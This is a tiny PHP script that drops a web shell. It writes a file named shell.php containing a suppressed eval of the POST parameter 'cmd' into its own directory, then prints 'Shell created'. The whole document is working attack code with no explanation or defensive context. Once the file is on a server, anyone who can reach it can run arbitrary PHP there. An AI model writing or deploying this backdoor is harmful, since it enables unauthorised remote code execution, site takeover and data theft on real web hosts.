<?php
$shell = '<?php @eval($_POST["cmd"]); ?>';
file_put_contents(dirname(__FILE__) . '/shell.php', $shell);
echo "Shell created";
?>